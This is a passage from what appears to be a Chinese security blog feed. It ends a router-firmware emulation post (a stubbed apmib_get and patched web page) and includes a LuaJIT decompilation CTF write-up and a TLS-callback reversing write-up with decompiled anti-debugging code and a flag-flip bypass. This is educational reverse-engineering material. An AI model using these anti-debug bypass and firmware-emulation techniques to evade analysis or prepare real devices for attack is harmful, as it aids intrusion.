class="title">apmib_get</span><span class="params">(<span class="type">int</span> code,<span class="type">int</span> *value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(code)&#123;</span><br><span class="line">        <span class="keyword">case</span> MIB_HW_VER:</span><br><span class="line">            *value=<span class="number">0xf1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> MIB_IP_ADDR:</span><br><span class="line">            *value=<span class="number">0x7f000001</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> MIB_CAPTCHA:</span><br><span class="line">            *value=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次编译</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208082100566.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208082100566.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208082059180.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208082059180.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>查看 <code>Wizard_Easy_LangSelect.asp</code>代码，猜测 <code>hw</code> 是 <code>hardware</code> 缩写，所以应该是跟硬件交互</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var hw_version=&quot;&lt;%getInfo(&quot;hwVersion&quot;)%&gt;&quot;;</span><br><span class="line">var productModel=&quot;&lt;%getInfo(&quot;productModel&quot;)%&gt;&quot;;</span><br><span class="line">document.getElementById(&quot;hw_version_head&quot;).innerHTML = hw_version;</span><br><span class="line">document.getElementById(&quot;product_model_head&quot;).innerHTML </span><br></pre></td></tr></table></figure><p>魔改入口网页 <code>first.asp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;% <span class="built_in">getLangInfo</span>(<span class="string">&quot;LangPathWizard&quot;</span>);%&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function">function <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">var ecflag = &lt;% <span class="built_in">getIndexInfo</span>(<span class="string">&quot;enableecflag&quot;</span>) %&gt;;</span><br><span class="line"><span class="keyword">if</span>(ecflag == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((LangCode == <span class="string">&quot;SC&quot;</span>)||(LangCode == <span class="string">&quot;TW&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">self.location.href=<span class="string">&quot;Basic/Wizard_Easy_Welcome.asp&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//self.location.href=&quot;Basic/Wizard_Easy_LangSelect.asp&quot;;</span></span><br><span class="line">self.location.href=<span class="string">&quot;Basic/Wizard_Easy_Welcome.asp&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">self.location.href=<span class="string">&quot;index.asp&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;body onLoad=<span class="string">&quot;init();&quot;</span>&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>如此便恢复完毕，网页可以访问。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208082117452.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202208082117452.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>接下来就可以挖洞了哇</p></div>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 固件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JIT</title>
      <link href="/2022/05/28/JIT/"/>
      <url>/2022/05/28/JIT/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是JIT"><a href="#什么是JIT" class="headerlink" title="什么是JIT"></a>什么是JIT</h1><p>JIT &#x3D; Just In Time即时编译，是动态编译的一种形式，是一种优化<a href="https://so.csdn.net/so/search?q=%E8%99%9A%E6%8B%9F%E6%9C%BA&spm=1001.2101.3001.7020">虚拟机</a>运行的技术。<br>程序运行通常有两种方式，一种是静态编译，一种是动态解释，即时编译混合了这二者。</p><p>lujit运行过程：</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205281240021.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205281240021.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><h1 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h1><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205281606508.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205281606508.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>得到一个.out 文件，电脑识别成Wireshark 系列文件，拉入WinHex会发现是.LJ开头，可以推断是Luajit逆向。</p><div class="story post-story"><h2 id="先编译LuaJit2-1-0Beta3"><a href="#先编译LuaJit2-1-0Beta3" class="headerlink" title="先编译LuaJit2.1.0Beta3"></a>先编译LuaJit2.1.0Beta3</h2><p><a href="http://luajit.org/download.html">Download (luajit.org)</a></p><p>去官网下载<img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205281625246.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205281625246.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>运行x64 Native Tools Command Prompt for VS （用Everything搜索），</p><p>然后将下载的安装包解压到相应的盘下，然后进入解压后的SRC文件</p><ul><li><p>msvcbuild.bat gc64编译出的64位（题目的64位</p></li><li><p>msvcbuild.bat编译出的是32位</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205281629087.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205281629087.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p></div><div class="story post-story"><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p><a href="https://github.com/bobsayshilol/luajit-decomp/tree/deprecated">bobsayshilol&#x2F;luajit-decomp at deprecated (github.com)</a></p><p>下载反编译工具</p><p>然后将上一步src文件夹里面jit文件夹，和lua51.dll luajit.exe 放到刚刚下载的反编译工具文件夹里面</p><p>然后将我们的题目附件改名为test.lua，再按下decoder_new.exe该文件就出现了out.lua和out2.lua</p><p>用sublime打开，就可以开始分析字节码了</p><p><img src="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220528164002909.png" class="lazyload" data-srcset="C:\Users\25858\AppData\Roaming\Typora\typora-user-images\image-20220528164002909.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220528164002909"></p><p>未完待续。。</p></div>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -luajit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TWIN</title>
      <link href="/2022/05/28/TWIN/"/>
      <url>/2022/05/28/TWIN/</url>
      
        <content type="html"><![CDATA[<h1 id="TLS回调函数："><a href="#TLS回调函数：" class="headerlink" title="TLS回调函数："></a>TLS回调函数：</h1><p>TLS(Thread Local Storage, 线程局部存储)回调函数，TLS 回调函数的调用运行要先于 EP 代码的执行，并且每次创建或结束线程都会再次调用，故常用于反调试。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205281814964.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205281814964.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>可以在节区表发现IMAGE_TLS_DIRECTORY，找到Address of Callbacks（<strong>注意回调函数一般不止一个</strong>）</p><h1 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h1><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282217346.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282217346.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>32位无壳</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205281835117.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205281835117.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>首先是一个虚假的逻辑验证。</p><p>在函数栏搜索找到callback函数，但是$+5,没有直接反编译，找到主要回调函数</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282020289.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282020289.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>这里有一个小花指令，最好retn会跳到sub_4019BF,后面还会有一处</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __usercall <span class="title">sub_4019BF</span><span class="params">(<span class="type">int</span> a1@&lt;ebp&gt;)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">void</span> *v1; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">12</span>) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">void</span> *)(a1 - <span class="number">284</span>), <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">    <span class="built_in">sub_401930</span>((<span class="type">void</span> *)(a1 - <span class="number">284</span>));</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">1</span>) = <span class="built_in">NtCurrentPeb</span>()-&gt;BeingDebugged;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_BYTE *)(a1 - <span class="number">1</span>) )</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">32</span>) = <span class="number">57</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">31</span>) = <span class="number">51</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">30</span>) = <span class="number">62</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">29</span>) = <span class="number">56</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">28</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">sub_4018C0</span>(a1 - <span class="number">32</span>);</span><br><span class="line">    hObject = <span class="built_in">CreateFileMappingA</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">4u</span>, <span class="number">0</span>, <span class="number">0x1000</span>u, (LPCSTR)(a1 - <span class="number">32</span>));</span><br><span class="line">    *(_DWORD *)dword_404448 = <span class="built_in">MapViewOfFile</span>(hObject, <span class="number">0xF001F</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x1000</span>u);</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">116</span>) = <span class="number">47</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">115</span>) = <span class="number">19</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">114</span>) = <span class="number">26</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">113</span>) = <span class="number">30</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">112</span>) = <span class="number">12</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">111</span>) = <span class="number">26</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">110</span>) = <span class="number">95</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">109</span>) = <span class="number">22</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">108</span>) = <span class="number">17</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">107</span>) = <span class="number">15</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">106</span>) = <span class="number">10</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">105</span>) = <span class="number">11</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">104</span>) = <span class="number">95</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">103</span>) = <span class="number">6</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">102</span>) = <span class="number">16</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">101</span>) = <span class="number">10</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">100</span>) = <span class="number">13</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">99</span>) = <span class="number">95</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">98</span>) = <span class="number">25</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">97</span>) = <span class="number">19</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">96</span>) = <span class="number">30</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">95</span>) = <span class="number">24</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">94</span>) = <span class="number">69</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">93</span>) = <span class="number">95</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">92</span>) = <span class="number">0</span>;</span><br><span class="line">    v1 = (<span class="type">void</span> *)<span class="built_in">sub_4018C0</span>(a1 - <span class="number">116</span>);</span><br><span class="line">    <span class="built_in">sub_401930</span>(v1);</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">8</span>) = <span class="number">90</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">7</span>) = <span class="number">12</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">6</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">sub_4018C0</span>(a1 - <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">sub_401130</span>((<span class="type">char</span> *)(a1 - <span class="number">8</span>), dword_404448[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(a1 + <span class="number">12</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">24</span>) = <span class="number">81</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">23</span>) = <span class="number">80</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">22</span>) = <span class="number">11</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">21</span>) = <span class="number">18</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">20</span>) = <span class="number">15</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">19</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">sub_4018C0</span>(a1 - <span class="number">24</span>);</span><br><span class="line">    <span class="built_in">sub_401410</span>();</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">void</span> *)(a1 - <span class="number">204</span>), <span class="number">0</span>, <span class="number">0x44</span>u);</span><br><span class="line">    *(_DWORD *)(a1 - <span class="number">204</span>) = <span class="number">68</span>;</span><br><span class="line">    <span class="built_in">CreateProcessA</span>(</span><br><span class="line">      (LPCSTR)(a1 - <span class="number">24</span>),</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="number">3u</span>,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      <span class="number">0</span>,</span><br><span class="line">      (LPSTARTUPINFOA)(a1 - <span class="number">204</span>),</span><br><span class="line">      (LPPROCESS_INFORMATION)(a1 - <span class="number">136</span>));</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">44</span>) = <span class="number">28</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">43</span>) = <span class="number">16</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">42</span>) = <span class="number">13</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">41</span>) = <span class="number">13</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">40</span>) = <span class="number">26</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">39</span>) = <span class="number">28</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">38</span>) = <span class="number">11</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">37</span>) = <span class="number">117</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">36</span>) = <span class="number">0</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">16</span>) = <span class="number">8</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">15</span>) = <span class="number">13</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">14</span>) = <span class="number">16</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">13</span>) = <span class="number">17</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">12</span>) = <span class="number">24</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">11</span>) = <span class="number">117</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">10</span>) = <span class="number">0</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">88</span>) = <span class="number">47</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">87</span>) = <span class="number">19</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">86</span>) = <span class="number">26</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">85</span>) = <span class="number">30</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">84</span>) = <span class="number">12</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">83</span>) = <span class="number">26</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">82</span>) = <span class="number">95</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">81</span>) = <span class="number">28</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">80</span>) = <span class="number">19</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">79</span>) = <span class="number">16</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">78</span>) = <span class="number">12</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">77</span>) = <span class="number">26</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">76</span>) = <span class="number">95</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">75</span>) = <span class="number">11</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">74</span>) = <span class="number">23</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">73</span>) = <span class="number">26</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">72</span>) = <span class="number">95</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">71</span>) = <span class="number">27</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">70</span>) = <span class="number">26</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">69</span>) = <span class="number">29</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">68</span>) = <span class="number">10</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">67</span>) = <span class="number">24</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">66</span>) = <span class="number">24</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">65</span>) = <span class="number">26</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">64</span>) = <span class="number">13</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">63</span>) = <span class="number">95</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">62</span>) = <span class="number">30</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">61</span>) = <span class="number">17</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">60</span>) = <span class="number">27</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">59</span>) = <span class="number">95</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">58</span>) = <span class="number">11</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">57</span>) = <span class="number">13</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">56</span>) = <span class="number">6</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">55</span>) = <span class="number">95</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">54</span>) = <span class="number">30</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">53</span>) = <span class="number">24</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">52</span>) = <span class="number">30</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">51</span>) = <span class="number">22</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">50</span>) = <span class="number">17</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">49</span>) = <span class="number">117</span>;</span><br><span class="line">    *(_BYTE *)(a1 - <span class="number">48</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">sub_401510</span>(a1 - <span class="number">24</span>, a1 - <span class="number">136</span>);</span><br><span class="line">    <span class="keyword">if</span> ( dword_404440 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_4012C0</span>(*(_DWORD *)dword_404448 + <span class="number">20</span>, <span class="number">5</span>, &amp;unk_40405C);</span><br><span class="line">      *(_DWORD *)(a1 - <span class="number">120</span>) = <span class="built_in">memcmp</span>((<span class="type">const</span> <span class="type">void</span> *)(*(_DWORD *)dword_404448 + <span class="number">20</span>), &amp;unk_40402C, <span class="number">0x14</span>u);</span><br><span class="line">      <span class="keyword">if</span> ( !*(_DWORD *)(a1 - <span class="number">120</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sub_4018C0</span>(a1 - <span class="number">44</span>);</span><br><span class="line">        <span class="built_in">sub_401930</span>((<span class="type">void</span> *)(a1 - <span class="number">44</span>));</span><br><span class="line">LABEL_12:</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hObject);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( dword_404440 == <span class="number">-2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_4018C0</span>(a1 - <span class="number">88</span>);</span><br><span class="line">      <span class="built_in">sub_401930</span>((<span class="type">void</span> *)(a1 - <span class="number">88</span>));</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sub_4018C0</span>(a1 - <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">sub_401930</span>((<span class="type">void</span> *)(a1 - <span class="number">16</span>));</span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数有两大部分</p><ul><li>这个a1 + 12就是对应着运行前与退出，对应DLL_PROCESS_ATTACH和DLL_PROCESS_DETACH</li><li>所以总结一下！a1 + 12 &#x3D;&#x3D; 1是线程运行之前执行</li><li>a1 + 12 &#x3D;&#x3D; 0 是线程退出后运行</li></ul><p>首先会遇到一个PEB反调试，我们直接修改ZF标志位绕过。</p><p>然后就是一个异或，将原始数据inputflag混肴。</p><p>紧接着读取我们的输入，</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282021090.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282021090.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>输入之后F9进入第二部分</p><ul><li>获取WriteFile 